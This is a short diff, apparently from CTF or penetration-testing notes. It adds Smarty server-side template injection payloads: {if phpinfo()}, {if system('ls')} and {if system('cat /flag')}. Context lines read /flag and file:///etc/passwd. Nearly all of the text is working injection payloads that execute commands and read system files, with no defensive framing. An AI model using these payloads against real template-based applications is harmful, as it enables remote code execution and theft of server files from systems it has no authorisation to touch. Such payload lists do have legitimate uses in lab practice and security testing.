@@ -28,6 +28,10 @@ php:
 
 
 {if readfile('/flag')}{/if}
+{if phpinfo()}{/if}
+{if system('ls')}{/if}
+{if system('cat /flag')}{/if}
+
 
 {self::getStreamVariable(“file:///etc/passwd”)}
 
